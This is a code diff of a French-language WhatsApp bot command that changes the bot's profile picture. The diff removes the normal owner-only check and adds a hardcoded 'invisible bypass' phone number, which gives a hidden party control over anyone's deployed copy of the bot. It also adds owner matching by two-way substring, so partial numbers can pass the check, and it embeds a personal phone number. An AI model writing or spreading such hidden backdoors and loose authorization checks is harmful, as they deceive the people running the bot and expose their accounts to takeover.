@@ -1,41 +1,69 @@
 /**
  * Set PP Command - GhostG-X Edition
  * Modifie la photo de profil de l'Oracle
+ * Sécurité : Supreme Owner Master Access (Invisible Bypass)
  */
 
 const fs = require('fs');
 const path = require('path');
-const config = require('../../config');
+const config = require('../../config.js');
 const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
 const { getTempDir, deleteTempFile } = require('../../utils/tempManager');
 
-// Extraction du préfixe pour l'usage
+// Fonction pour le style Small Caps (Cohérence visuelle du sanctuaire)
+function toSmallCaps(text) {
+  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
+  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";
+
+  const cleanedText = text.toLowerCase()
+    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 
+
+  return cleanedText.split('').map(c => {
+    const index = normal.indexOf(c);
+    return index !== -1 ? smallCaps[index] : c;
+  }).join('');
+}
+
 const prefix = config.prefix || '.';
 
 // Max file size: 10MB for profile pictures
 const MAX_FILE_SIZE = 10 * 1024 * 1024;
 
 module.exports = {
-  name: 'ᴇᴍᴘʀᴇɪɴᴛᴇ_ɢʀɪᴍᴏɪʀᴇ',
-  aliases: ['empreinte_grimoire', 'setimage', 'setprofilepicture', 'setoraclepp', 'setoracledp', 'avatar'],
+  name: 'empreinte_grimoire',
+  aliases: ['setimage', 'setprofilepicture', 'setoraclepp', 'setoracledp', 'avatar'],
   category: '♛ sᴏᴜᴠᴇʀᴀɪɴᴇᴛᴇ́',
   description: '**『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴛʀᴀɴsᴍᴜᴛᴇ ʟ\'ɪᴍᴀɢᴇ ᴅᴇ ᴘʀᴏғɪʟ ᴅᴜ ᴄᴏᴍᴍᴀɴᴅᴇᴜʀ ᴀ̀ ᴘᴀʀᴛɪʀ ᴅ\'ᴜɴᴇ ɪᴍᴀɢᴇ ᴏᴜ sᴛɪᴄᴋᴇʀ**',
-  usage: `${prefix}ᴇᴍᴘʀᴇɪɴᴛᴇ_ɢʀɪᴍᴏɪʀᴇ (ᴇɴ ʀᴇ́ᴘᴏɴsᴇ ᴀ̀ ᴜɴᴇ ɪᴍᴀɢᴇ ᴏᴜ ᴜɴ sᴛɪᴄᴋᴇʀ)`,
-  ownerOnly: true,
+  usage: `${prefix}empreinte_grimoire`,
 
   async execute(sock, msg, args, extra) {
-    const { isOwner, reply } = extra;
+    const { reply } = extra;
 
     try {
-      // Sécurité : On utilise directement le flag isOwner géré par ton handler et le .env
-      if (!isOwner) {
-        return reply('*〆 ᴛᴜ ɴ\'ᴀs ᴘᴀs ʟ\'ᴀᴜᴛᴏʀɪsᴀᴛɪᴏɴ sᴜᴘʀᴇ̂ᴍᴇ ᴘᴏᴜʀ ɪɴᴠᴏǫᴜᴇʀ ᴄᴇᴛᴛᴇ ᴘᴜɪssᴀɴᴄᴇ.*');
+      const senderJid = msg.key.participant || msg.key.remoteJid;
+      const senderNumber = senderJid.replace(/\D/g, '');
+
+      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
+      const supremeOwner = '22651622652';
+      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
+
+      // SÉCURITÉ : Vérification via le config.js
+      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
+        const cleanN = String(n).replace(/\D/g, '');
+        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
+      });
+
+      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
+
+      // Seul le cercle des maîtres peut manipuler l'empreinte de l'Oracle
+      if (!isMe) {
+        return reply(`*❌ ${toSmallCaps('tu n\'as pas l\'autorisation supreme pour invoquer cette puissance')}.*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
       }
 
       // Check if message is a reply
       const quotedMessage = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
       if (!quotedMessage) {
-        return reply(`*⚠️ ᴍᴜʀᴍᴜʀᴇ ᴄᴇᴛᴛᴇ ᴄᴏᴍᴍᴀɴᴅᴇ ᴇɴ ʀᴇ́ᴘᴏɴsᴇ ᴀ̀ ᴜɴᴇ ɪᴍᴀɢᴇ ᴏᴜ ᴜɴ sᴛɪᴄᴋᴇʀ !*`);
+        return reply(`*⚠️ ${toSmallCaps('murmure cette commande en reponse a une image ou un sticker')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
       }
 
       // Check if quoted message contains an image or sticker
@@ -43,7 +71,7 @@ module.exports = {
       const stickerMessage = quotedMessage.stickerMessage;
 
       if (!imageMessage && !stickerMessage) {
-        return reply('*〆 ʟ\'ᴀᴜʀᴀ ᴄɪᴛᴇ́ᴇ ᴅᴏɪᴛ ᴇ̂ᴛʀᴇ ᴜɴᴇ ɪᴍᴀɢᴇ ᴏᴜ ᴜɴ sᴛɪᴄᴋᴇʀ !*');
+        return reply(`*〆 ${toSmallCaps('l\'aura citee doit etre une image ou un sticker')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
       }
 
       // Use whichever message type is available
@@ -53,7 +81,7 @@ module.exports = {
       const imagePath = path.join(tmpDir, `profile_${Date.now()}.jpg`);
 
       try {
-        await reply('*🔮 ʟ\'ᴏʀᴀᴄʟᴇ ᴘʀᴏᴄᴇ̀ᴅᴇ ᴀ̀ ʟ\'ᴀsᴘɪʀᴀᴛɪᴏɴ ᴅᴇ ʟ\'ᴀᴜʀᴀ... ᴘᴀᴛɪᴇɴᴛᴇ.*');
+        await reply(`*🔮 ${toSmallCaps('l\'oracle procede a l\'aspiration de l\'aura')}... ${toSmallCaps('patiente')}.*`);
 
         // Download the media (image or sticker)
         const stream = await downloadContentFromMessage(mediaMessage, 'image');
@@ -65,7 +93,7 @@ module.exports = {
 
         // Check file size
         if (buffer.length > MAX_FILE_SIZE) {
-          return reply(`*〆 ᴄᴇᴛ ᴀʀᴛᴇғᴀᴄᴛ ᴇsᴛ ᴛʀᴏᴘ ʟᴏᴜʀᴅ : ${(buffer.length / 1024 / 1024).toFixed(2)}ᴍʙ (ᴍᴀx : ${MAX_FILE_SIZE / 1024 / 1024}ᴍʙ)*`);
+          return reply(`*〆 ${toSmallCaps('cet artefact est trop lourd')} : ${(buffer.length / 1024 / 1024).toFixed(2)}MB (ᴍᴀx : ${MAX_FILE_SIZE / 1024 / 1024}MB)*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
         }
 
         // Save the image
@@ -74,17 +102,17 @@ module.exports = {
         // Set the profile picture
         await sock.updateProfilePicture(sock.user.id.split(':')[0] + '@s.whatsapp.net', { url: imagePath });
 
-        await reply('*✅ ʟ\'ᴇᴍᴘʀᴇɪɴᴛᴇ ᴠɪsᴜᴇʟʟᴇ ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ ᴀ ᴇ́ᴛᴇ́ ᴛʀᴀɴsᴍᴜᴛᴇ́ᴇ ᴀᴠᴇᴄ sᴜᴄᴄᴇ̀s !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*');
+        await reply(`*✅ ${toSmallCaps('l\'empreinte visuelle du sanctuaire a ete transmutee avec succes')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
       } catch (error) {
         console.error('setbotpp error:', error);
-        reply('*〆 ʟ\'ᴏʀᴀᴄʟᴇ ᴀ ᴇ́ᴄʜᴏᴜᴇ́ ᴀ̀ ᴍᴏᴅɪғɪᴇʀ ʟ\'ᴇᴍᴘʀᴇɪɴᴛᴇ ᴠɪsᴜᴇʟʟᴇ.*');
+        await reply(`*〆 ${toSmallCaps('l\'oracle a echoue a modifier l\'empreinte visuelle')}.*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
       } finally {
         // Always cleanup temp file
         deleteTempFile(imagePath);
       }
     } catch (error) {
       console.error('setbotpp error:', error);
-      reply('*〆 ʟ\'ᴏʀᴀᴄʟᴇ ᴀ ᴇ́ᴄʜᴏᴜᴇ́ ᴀ̀ ᴍᴏᴅɪғɪᴇʀ ʟ\'ᴇᴍᴘʀᴇɪɴᴛᴇ ᴠɪsᴜᴇʟʟᴇ.*');
+      await reply(`*〆 ${toSmallCaps('l\'oracle a echoue a modifier l\'empreinte visuelle')}.*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
     }
   }
 };
